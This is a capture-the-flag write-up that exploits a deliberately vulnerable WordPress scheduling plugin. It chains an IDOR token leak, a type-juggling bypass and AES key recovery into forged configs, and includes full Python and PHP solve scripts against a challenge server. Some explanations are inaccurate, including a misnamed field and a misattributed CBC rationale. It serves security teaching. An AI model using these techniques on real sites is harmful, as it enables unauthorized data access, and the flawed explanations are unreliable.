# Patchstack Scheduler Pro

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
    - [Leaking AES key](#leaking-aes-key)
    - [Forging Our Own Encrypted Data](#forging-our-own-encrypted-data)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 18 solves / 350 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

Patchstack needed to update their Blog content and asked a freelancer to make a plugin for scheduling their newest advisories. It has not been tested yet can you check it for us?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224190103.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|19:02:48(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|19:02:50(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
   creating: server-given/challenge-custom/
   creating: server-given/challenge-custom/patchstack-scheduler-pro/
  inflating: server-given/challenge-custom/patchstack-scheduler-pro/patchstack-scheduler-pro.php  
   creating: server-given/challenge-custom/patchstack-scheduler-pro/includes/
  [...]
  inflating: server-given/docker/wordpress/toolbox/Dockerfile  
  inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Just like my writeup for the [A Nice Block](https://siunam321.github.io/ctf/Patchstack-Alliance-CTF-S02E01/A-Nice-Block) challenge, we should first take a look at the `server-given/docker/wordpress/toolbox/Makefile` file:

```bash
[...]
# Activate plugin first to generate API token
$(WP_CLI) plugin activate patchstack-scheduler-pro
@sleep 5  # Give it a moment to generate the token

# Generate a random position between 1 and 50 for the config post
@RANDOM_POS=$$(( ( RANDOM % 50 ) + 1 )); \
CURRENT_POST=1; \
while [ $$CURRENT_POST -le 50 ]; do \
    if [ $$CURRENT_POST -eq $$RANDOM_POS ]; then \
        $(WP_CLI) post create \
            --post_type=post \
            --post_title="Patchstack Scheduler Configuration" \
            --post_content="API Token: $$($(WP_CLI) option get ps_api_token 2>/dev/null)" \
            --post_status=draft; \
    else \
        $(WP_CLI) post create \
            --post_type=post \
            --post_title="Draft Social Media Content $$CURRENT_POST" \
            --post_content="This is a draft content for post $$CURRENT_POST, Patchstack Blog Post will be scheduled at 10:00 AM" \
            --post_status=draft; \
    fi; \
    CURRENT_POST=$$((CURRENT_POST + 1)); \
done
```

As you can see, it uses the [WP CLI](https://wp-cli.org/) to set up the WordPress site, including activate plugin `patchstack-scheduler-pro` and **create 50 random posts**. Huh, why it's creating 50 posts?

Although they are all draft posts, 1 of them stood out the most:

```bash
# Generate a random position between 1 and 50 for the config post
@RANDOM_POS=$$(( ( RANDOM % 50 ) + 1 )); \
CURRENT_POST=1; \
while [ $$CURRENT_POST -le 50 ]; do \
    if [ $$CURRENT_POST -eq $$RANDOM_POS ]; then \
        $(WP_CLI) post create \
            --post_type=post \
            --post_title="Patchstack Scheduler Configuration" \
            --post_content="API Token: $$($(WP_CLI) option get ps_api_token 2>/dev/null)" \
            --post_status=draft; \
    else \
        [...]
    fi; \
    CURRENT_POST=$$((CURRENT_POST + 1)); \
done
```

In here, one of many random posts will have title "Patchstack Scheduler Configuration" with content of an API token. This token is fetched from option `ps_api_token`.

Hmm... Weird. Let's read this plugin's source code in order to have a better understanding in this API token thingy.

First off, what's is the objective in this challenge? Where's the flag?

In class `PatchstackSchedulerPro`'s method `handle_settings_request` at `challenge-custom/patchstack-scheduler-pro/patchstack-scheduler-pro.php`, it'll send us the flag if certain conditions are met. This callback method is executed via an **unauthenticated AJAX action `patchstack_scheduler_settings`**:

```php
class PatchstackSchedulerPro {
    [...]
    private function __construct() {
        [...]
        add_action('wp_ajax_nopriv_patchstack_scheduler_settings', array($this, 'handle_settings_request'));
        add_action('wp_ajax_patchstack_scheduler_settings', array($this, 'handle_settings_request'));
        [...]
    }
}
```

Let's understand that callback method's logic!

First, it'll try to **decrypt** our JSON attribute `config`'s value using **AES with key size 256 bits and CBC mode**, where our `config` value the first 16 characters are `$uuid`, and the rest of it are the encrypted data:

```php
class PatchstackSchedulerPro {
    [...]
    private $encryption_key = null;
    [...]
    public function handle_settings_request() {
        $data = json_decode(file_get_contents('php://input'), true);
        [...]
        try {
            $decoded = base64_decode($data['config']);
            $uuid = substr($decoded, 0, 16);
            $encrypted = substr($decoded, 16);
            
            $decrypted = openssl_decrypt(
                base64_encode($encrypted),
                'AES-256-CBC',
                $this->encryption_key,
                0,
                $uuid
            );
            [...]
        } catch (Exception $e) {
            [...]
        }
    }
}
```

In the above decryption process, it uses PHP function `openssl_decrypt` to decrypt our data using key `$this->encryption_key` and IV ([Initialization Vector](https://en.wikipedia.org/wiki/Initialization_vector)) `$uuid`.

After decrypting our JSON attribute `config`, it'll parse the decrypted JSON object into an associative array. **If the array's key `status` is string `publish`, `['permissions']['all']` is boolean `true`, and `flag_access` is boolean `true`**, it'll send us the flag:

```php
class PatchstackSchedulerPro {
    [...]
    public function handle_settings_request() {
        [...]
        try {
            [...]
            $config = json_decode($decrypted, true);
            
            if ($config && 
                isset($config['status']) && 
                $config['status'] === 'publish' && 
                isset($config['permissions']['all']) && 
                $config['permissions']['all'] === true &&
                isset($config['flag_access']) &&
                $config['flag_access'] === true) {
                    $flag = @file_get_contents('/flag.txt');
                    wp_send_json_success(array(
                        'message' => 'Configuration updated',
                        'flag' => trim($flag)
                    ));
                    return;
            }
            [...]
        } catch (Exception $e) {
            [...]
        }
    }
}
```

With that said, we need to **somehow know the key (`$this->encryption_key`) and the IV (`$uuid`)** to generate the correct encrypted data to get the flag.

Hmm... How's the key being generated? If we look at the `__construte` magic method, the key is fetched from option `ps_encryption_key`, which is **a random UUIDv4 string** generated via WordPress function [`wp_generate_uuid4`](https://developer.wordpress.org/reference/functions/wp_generate_uuid4/):

```php
class PatchstackSchedulerPro {
    [...]
    private function __construct() {
        [...]
        if (!get_option('ps_encryption_key')) {
            update_option('ps_encryption_key', wp_generate_uuid4());
        }
        $this->encryption_key = get_option('ps_encryption_key');
    }
}
```
 
Huh, maybe we can leak this UUIDv4 string in somewhere? Well yes, sort of.

### Leaking AES key

In private method `get_encrypted_config`, a default config is encrypted with the key's **partial UUIDv4**:

```php
class PatchstackSchedulerPro {
    [...]
    private function get_encrypted_config() {
        $config = array(
            'status' => 'draft',
            'permissions' => array(
                'view' => true,
                'edit' => false
            ),
            'encryption_key' => $this->encryption_key
        );
        
        $uuid = substr($this->encryption_key, 0, 16);
        $encrypted = openssl_encrypt(
            json_encode($config),
            'AES-256-CBC',
            $uuid,
            0,
            $uuid
        );
        
        return base64_encode($uuid . base64_decode($encrypted));
    }
}
```

As you can see, the key it used in here is just **the first 16 characters of the UUIDv4 string**. After that, it'll **return the base64 encoded partial UUIDv4 string** and the base64 decoded encrypted bytes. Since UUIDv4 has 36 characters (32 hex digits + 4 dashes), this method effectively **leaks almost the first half of the key**.

Great! How can we call this private method then? If we look at AJAX action `patchstack_scheduler_compare`'s callback method `handle_compare_request`, it'll call private method `get_encrypted_config`:

```php
class PatchstackSchedulerPro {
    [...]
    private function __construct() {
        [...]
        add_action('wp_ajax_nopriv_patchstack_scheduler_compare', array($this, 'handle_compare_request'));
        add_action('wp_ajax_patchstack_scheduler_compare', array($this, 'handle_compare_request'));
        [...]
    }
    [...]
    public function handle_compare_request() {
        [...]
        if (isset($data['revision_data']) && isset($data['revision_data']['post_status'])) {
            $status = $data['revision_data']['post_status'];
            if ($status === 'draft') {
                $config = $this->get_encrypted_config();
                wp_send_json_success(array('encrypted_config' => $config));
                return;
            }
        }
        
        wp_send_json_error('Invalid revision data');
    }
}
```

However, there are some validations. Let's break them down one by one!

First, this callback method accepts both JSON and POST method body data:

```php
class PatchstackSchedulerPro {
    [...]
    public function handle_compare_request() {
        $raw_data = file_get_contents('php://input');
        $content_type = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
        
        if (strpos($content_type, 'application/json') !== false) {
            $data = json_decode($raw_data, true);
        } else {
            $data = $_POST;
        }
        [...]
    }
}
```

For the sake of simplicity, I'll be using the JSON body data throughout this method's walkthrough.

After that, if our JSON attribute `api_token` is **strictly equal to (`===`)** option `ps_api_token`, we can pass the first validation:

```php
class PatchstackSchedulerPro {
    [...]
    public function handle_compare_request() {
        [...]
        if (!isset($data['api_token']) || $data['api_token'] !== get_option('ps_api_token')) {
            wp_send_json_error('Invalid API token');
            return;
        }
        [...]
    }
}
```

Then, if our JSON attribute `encryption_key` is **loosely equal to (`==`)** the UUIDv4 key, we can pass the second validation:

```php
class PatchstackSchedulerPro {
    [...]
    public function handle_compare_request() {
        [...]
        if (!isset($data['encryption_key']) || $data['encryption_key'] != $this->encryption_key) {
            wp_send_json_error('Invalid encryption key');
            return;
        }
        [...]
    }
}
```

Finally, if both validations are passed and JSON attribute `revision_data`'s associative array key `post_status` is string `draft`, it'll call the private method `get_encrypted_config`:

```php
class PatchstackSchedulerPro {
    [...]
    public function handle_compare_request() {
        [...]
        if (isset($data['revision_data']) && isset($data['revision_data']['post_status'])) {
            $status = $data['revision_data']['post_status'];
            if ($status === 'draft') {
                $config = $this->get_encrypted_config();
                wp_send_json_success(array('encrypted_config' => $config));
                return;
            }
        }
        [...]
    }
}
```

Okay, let's deal with the first validation, the `api_token`. Since it's a strict comparison, we need to find an exact same value of option `ps_api_token`, which is a random 32 characters string generated via WordPress function [`wp_generate_password`](https://developer.wordpress.org/reference/functions/wp_generate_password/):

```php
class PatchstackSchedulerPro {
    [...]
    private function __construct() {
        [...]
        if (!get_option('ps_api_token')) {
            update_option('ps_api_token', wp_generate_password(32, false));
        }
        [...]
    }
}
```

Hmm... Wait a minute, did you still remember those random posts? **The API token is in one of those posts**!

```bash
# Generate a random position between 1 and 50 for the config post
@RANDOM_POS=$$(( ( RANDOM % 50 ) + 1 )); \
CURRENT_POST=1; \
while [ $$CURRENT_POST -le 50 ]; do \
    if [ $$CURRENT_POST -eq $$RANDOM_POS ]; then \
        $(WP_CLI) post create \
            --post_type=post \
            --post_title="Patchstack Scheduler Configuration" \
            --post_content="API Token: $$($(WP_CLI) option get ps_api_token 2>/dev/null)" \
            --post_status=draft; \
    else \
        [...]
    fi; \
    CURRENT_POST=$$((CURRENT_POST + 1)); \
done
```

Uh, wait, the post status is draft. How can we read its content?

Fortunately for us, there's an AJAX action called `patchstack_scheduler_preview` is vulnerable to **IDOR (Insecure Direct Object Reference)**, where we can **obtain any posts' details even if it's status is private or draft**:

```php
class PatchstackSchedulerPro {
    [...]
    private function __construct() {
        [...]
        add_action('wp_ajax_nopriv_patchstack_scheduler_preview', array($this, 'handle_preview_request'));
        add_action('wp_ajax_patchstack_scheduler_preview', array($this, 'handle_preview_request'));
        [...]
    }
    [...]
    public function handle_preview_request() {
        $post_id = isset($_GET['post_id']) ? intval($_GET['post_id']) : 0;
        $post = get_post($post_id);
        [...]
        wp_send_json_success(array(
            'content' => $post->post_content,
            'title' => $post->post_title
        ));
    }
}
```

In callback method `handle_preview_request`, we can provide GET parameter `post_id` to read any posts, as it didn't validate the post's status.

With that said, we can write a simple Python script to get the API token via this vulnerable AJAX action!

<details><summary><strong>get_api_token.py</strong></summary>

```python
#!/usr/bin/env python3
import requests

AJAX_ENDPOINT = '/wp-admin/admin-ajax.php'
READ_POST_AJAX_ACTION = 'patchstack_scheduler_preview'

def getApiToken(baseUrl):
    for postId in range(1, 100):
        print(f'[*] Trying post ID: {postId}', end='\r')
        parameter = {
            'action': READ_POST_AJAX_ACTION,
            'post_id': str(postId)
        }
        jsonResponse = requests.get(f'{baseUrl}{AJAX_ENDPOINT}', params=parameter).json()
        if jsonResponse['data'] == 'Post not found':
            continue
        if not jsonResponse['data']['content'].startswith('API Token: '):
            continue

        return jsonResponse['data']['content'].split(': ')[1]

if __name__ == '__main__':
    baseUrl = 'http://52.77.81.199:9192'
    apiToken = getApiToken(baseUrl)
    print(f'\n[+] API token: {apiToken}')
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|20:29:11(HKT)]
└> python3 get_api_token.py
[*] Trying post ID: 36
[+] API token: X1xyWiJlgs0uCvEyRwGfNLrTlpFas3mS
```

Nice! We got the API token in post ID 36! Which means we can pass the first validation!

Now, how about the second validation? Well, since it's using **loose comparison**, we can leverage **type jugging** to bypass the it!

Since loose comparison doesn't care about the data type, if JSON attribute `api_token` is a `true` boolean value, it'll compare integer `1` with integer `1` (`'not_an_empty_string'`), which returns boolean `true`:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|20:31:50(HKT)]
└> php -a                  
[...]
php > var_dump(true == 'not_an_empty_string');
bool(true)
```

So, to bypass the second validation, we simply use boolean `true` in our JSON attribute `encryption_key`'s value.

With all of these, we can now leak the first 16 characters of the UUIDv4 key by sending the following POST request:

```http
POST /wp-admin/admin-ajax.php?action=patchstack_scheduler_compare HTTP/1.1
Host: 52.77.81.199:9192
Content-Length: 150
Content-Type: application/json;charset=UTF-8

{
    "api_token": "X1xyWiJlgs0uCvEyRwGfNLrTlpFas3mS",
    "encryption_key": true,
    "revision_data": {
        "post_status": "draft"
    }
}
```

Response JSON body data:

```json
{
    "success": true,
    "data": {
        "encrypted_config": "MWEwNDY1YWQtMTFkMy00NG3dDSyMtvZuU+aUR3m+mhbmL97Xms5PKdE68WEwW3Qm54qJ9mGDY4Ar39kDk23WXzu5T7MZ/RKX2bdbRO7jcbp1ALhvPEpVM2LAM0a6y+cnM7bok0/lA2APiaurEdz4eH6xddsf6RQ/AeO9QNCZI/1iQC1rpGJyA40KmhIwl6Vg"
    }
}
```

To get the almost first half the UUIDv4 string, we can slice the first 16 characters in the base64 encoded `encrypted_config`:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|20:37:37(HKT)]
└> php -a
[...]
php > $uuid = base64_decode(substr("MWEwNDY1YWQtMTFkMy00NG3dDSyMtvZuU+aUR3m+mhbmL97Xms5PKdE68WEwW3Qm54qJ9mGDY4Ar39kDk23WXzu5T7MZ/RKX2bdbRO7jcbp1ALhvPEpVM2LAM0a6y+cnM7bok0/lA2APiaurEdz4eH6xddsf6RQ/AeO9QNCZI/1iQC1rpGJyA40KmhIwl6Vg", 0, 22));
php > echo strlen($uuid);
16
php > echo $uuid;
1a0465ad-11d3-44
```

As you can see, the leaked UUIDv4 string is `1a0465ad-11d3-44`!

But here's a question: How can we leak the full UUIDv4 key??

Well, don't forget which encryption algorithm the plugin is using, **AES** with key size 256 bits and CBC mode. Since AES is a **block cipher**, it encrypts and decrypts data in a **fixed block size chunk**. In AES, the block size is always 128 bits. Or **16 bytes** (16 characters).

Hmm... What happens if we try to decrypt an encrypted data with a key length of 16 characters? **Will it decrypt the first block?**

Let's try this!

```php
<?php
function getFullEncryptionKey($encryptedDataWithUUid) {
    $decoded = base64_decode($encryptedDataWithUUid);
    $partiallyLeakedUuidv4 = substr($decoded, 0, 16);
    $encryptedData = substr($decoded, 16);
    $decryptedData = openssl_decrypt(
        base64_encode($encryptedData),
        'AES-256-CBC',
        $partiallyLeakedUuidv4,
        0,
        $partiallyLeakedUuidv4
    );
    
    return json_decode($decryptedData, true);
}

$encryptedDataWithUUid = 'MWEwNDY1YWQtMTFkMy00NG3dDSyMtvZuU+aUR3m+mhbmL97Xms5PKdE68WEwW3Qm54qJ9mGDY4Ar39kDk23WXzu5T7MZ/RKX2bdbRO7jcbp1ALhvPEpVM2LAM0a6y+cnM7bok0/lA2APiaurEdz4eH6xddsf6RQ/AeO9QNCZI/1iQC1rpGJyA40KmhIwl6Vg';

$decryptedConfig = getFullEncryptionKey($encryptedDataWithUUid);
print_r($decryptedConfig);
```

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|20:57:00(HKT)]
└> php forge_encrypted_data.php
Array
(
    [status] => draft
    [permissions] => Array
        (
            [view] => 1
            [edit] => 
        )

    [encryption_key] => 1a0465ad-11d3-440c-9b80-42d429652c9c
)
```

Oh! It worked! We successfully decrypted the encrypted data!

Why? Because it's using CBC mode, which means each block of plaintext is XORed with the previous ciphertext block before being encrypted. So, as long as the first block is decrypted successfully, the next block can also be decrypted, and so on.

![](https://upload.wikimedia.org/wikipedia/commons/2/2a/CBC_decryption.svg)

### Forging Our Own Encrypted Data

With the fully leaked encryption key, we can now forge our own encrypted data!

One thing to notice is that the plugin uses a different key to encrypt and decrypt:

```php
// decryption
openssl_decrypt(
    base64_encode($encrypted),
    'AES-256-CBC',
    $this->encryption_key, // 36 characters of the encryption key
    0,
    $uuid
);

// encryption
openssl_encrypt(
    json_encode($config),
    'AES-256-CBC',
    $uuid, // 16 characters of the encryption key
    0,
    $uuid
);
```

So, to forge our own encrypted data, we need to use the fully leaked 36 characters key instead of the partial leaked one:

```php
function forgeConfig($decryptedConfig) {
    $decryptedConfig['status'] = 'publish';
    $decryptedConfig['permissions'] = array( 'all' => true );
    $decryptedConfig['flag_access'] = true;

    $uuid = substr($decryptedConfig['encryption_key'], 0, 16);
    $encryptedForgedConfig = openssl_encrypt(
        json_encode($decryptedConfig),
        'AES-256-CBC',
        $decryptedConfig['encryption_key'],
        0,
        $uuid
    );
    return base64_encode($uuid . base64_decode($encryptedForgedConfig));
}
[...]
$encryptedForgedConfig = forgeConfig($decryptedConfig);
echo "[*] Forged encrypted config:\n";
print_r($encryptedForgedConfig);
```

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|21:18:03(HKT)]
└> php forge_encrypted_data.php
[...]
[*] Forged encrypted config:
MWEwNDY1YWQtMTFkMy00NBNIFjAu66sd6Nnz83BhD+1Jpn18yM/ym6Szov5d8MU2XUbu+dvlmap+PuHPfiDhXyqtUuJL55byn0tM+OX+M43UVWSi3c06YVe3g5qVVs5ajv+LPOWaddqVJHtyvbLDwU9JApfPhg++Y+F/G/UpjSSRtBnt0cwv2G1jg5Xv2Xg2
```

## Exploitation

To get the flag, we need to:
1. Get the API token via AJAX action that is vulnerable to IDOR
2. Leak the encryption key via bypassing the validations
3. Forge our own encrypted config
4. Get the flag via AJAX action `patchstack_scheduler_settings` with the forged config

To automate the above steps, I've written the following solve PHP script:

<details><summary><strong>solve.php</strong></summary>

```php
<?php
class Solver {
    public $baseUrl;
    private $AJAX_ENDPOINT = '/wp-admin/admin-ajax.php';
    private $READ_POST_AJAX_ACTION = 'patchstack_scheduler_preview';
    private $GET_ENCRYPTED_CONFIG_AJAX_ACTION = 'patchstack_scheduler_compare';
    private $GET_FLAG_AJAX_ACTION = 'patchstack_scheduler_settings';

    function __construct($baseUrl) {
        $this->baseUrl = $baseUrl;
    }

    public function getApiToken() {
        for ($postId=1; $postId <= 100; $postId++) { 
            $handle = curl_init($this->baseUrl . $this->AJAX_ENDPOINT . '?action=' . $this->READ_POST_AJAX_ACTION . '&post_id=' . strval($postId));
            curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($handle);
            curl_close($handle);

            $jsonResponse = json_decode($response, true);
            if ($jsonResponse['data'] === 'Post not found') {
                continue;
            }
            if (!str_starts_with($jsonResponse['data']['content'], 'API Token: ')) {
                continue;
            }
    
            return explode(': ', $jsonResponse['data']['content'])[1];
        }
    }

    public function getEncryptedConfig($apiToken) {
        $jsonData = json_encode(array(
            'api_token' => $apiToken,
            'encryption_key' => true,
            'revision_data' => array( 'post_status' => 'draft' )
        ));

        $handle = curl_init($this->baseUrl . $this->AJAX_ENDPOINT . '?action=' . $this->GET_ENCRYPTED_CONFIG_AJAX_ACTION);
        curl_setopt($handle, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($handle, CURLOPT_POST, 1);
        curl_setopt($handle, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($handle);
        curl_close($handle);

        return json_decode($response, true)['data']['encrypted_config'];
    }

    public function getFullEncryptionKey($encryptedDataWithUUid) {
        $decoded = base64_decode($encryptedDataWithUUid);
        $partiallyLeakedUuidv4 = substr($decoded, 0, 16);
        $encryptedData = substr($decoded, 16);
        $decryptedData = openssl_decrypt(
            base64_encode($encryptedData),
            'AES-256-CBC',
            $partiallyLeakedUuidv4,
            0,
            $partiallyLeakedUuidv4
        );
        
        return json_decode($decryptedData, true);
    }
    
    public function forgeConfig($decryptedConfig) {
        $decryptedConfig['status'] = 'publish';
        $decryptedConfig['permissions'] = array( 'all' => true );
        $decryptedConfig['flag_access'] = true;
    
        $uuid = substr($decryptedConfig['encryption_key'], 0, 16);
        $encryptedForgedConfig = openssl_encrypt(
            json_encode($decryptedConfig),
            'AES-256-CBC',
            $decryptedConfig['encryption_key'],
            0,
            $uuid
        );
        return base64_encode($uuid . base64_decode($encryptedForgedConfig));
    }

    public function getFlag($encryptedForgedConfig) {
        $jsonData = json_encode(array( 'config' => $encryptedForgedConfig ));

        $handle = curl_init($this->baseUrl . $this->AJAX_ENDPOINT . '?action=' . $this->GET_FLAG_AJAX_ACTION);
        curl_setopt($handle, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($handle, CURLOPT_POST, 1);
        curl_setopt($handle, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($handle);
        curl_close($handle);

        $flag = json_decode($response, true)['data']['flag'];
        printf(PHP_EOL . '[+] Flag: %s', $flag);
    }

    public function solve() {
        echo "[*] Getting the API token...\n";
        $apiToken = $this->getApiToken();
        printf('[+] API token: %s' . PHP_EOL, $apiToken);

        $encryptedDataWithUUid = $this->getEncryptedConfig($apiToken);
        echo "[*] Encrypted config:\n";
        print_r($encryptedDataWithUUid);

        $decryptedConfig = $this->getFullEncryptionKey($encryptedDataWithUUid);
        echo "\n[*] Decrypted config:\n";
        print_r($decryptedConfig);
        
        $encryptedForgedConfig = $this->forgeConfig($decryptedConfig);
        echo "[*] Forged encrypted config:\n";
        print_r($encryptedForgedConfig);

        $this->getFlag($encryptedForgedConfig);
    }
}

$baseUrl = 'http://52.77.81.199:9192';
$solver = new Solver($baseUrl);

$solver->solve();
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/Patchstack-Scheduler-Pro)-[2025.02.24|21:48:43(HKT)]
└> php solve.php
[*] Getting the API token...
[+] API token: X1xyWiJlgs0uCvEyRwGfNLrTlpFas3mS
[*] Encrypted config:
MWEwNDY1YWQtMTFkMy00NG3dDSyMtvZuU+aUR3m+mhbmL97Xms5PKdE68WEwW3Qm54qJ9mGDY4Ar39kDk23WXzu5T7MZ/RKX2bdbRO7jcbp1ALhvPEpVM2LAM0a6y+cnM7bok0/lA2APiaurEdz4eH6xddsf6RQ/AeO9QNCZI/1iQC1rpGJyA40KmhIwl6Vg
[*] Decrypted config:
Array
(
    [status] => draft
    [permissions] => Array
        (
            [view] => 1
            [edit] => 
        )

    [encryption_key] => 1a0465ad-11d3-440c-9b80-42d429652c9c
)
[*] Forged encrypted config:
MWEwNDY1YWQtMTFkMy00NBNIFjAu66sd6Nnz83BhD+1Jpn18yM/ym6Szov5d8MU2XUbu+dvlmap+PuHPfiDhXyqtUuJL55byn0tM+OX+M43UVWSi3c06YVe3g5qVVs5ajv+LPOWaddqVJHtyvbLDwU9JApfPhg++Y+F/G/UpjSSRtBnt0cwv2G1jg5Xv2Xg2
[+] Flag: CTF{crypt0_aint_crypt0ing_patchstack2o25}
```

- **Flag: `CTF{crypt0_aint_crypt0ing_patchstack2o25}`**

## Conclusion

What we've learned:

1. IDOR to read arbitrary posts
2. Decrypt AES CBC mode encrypted data using 16 characters partial key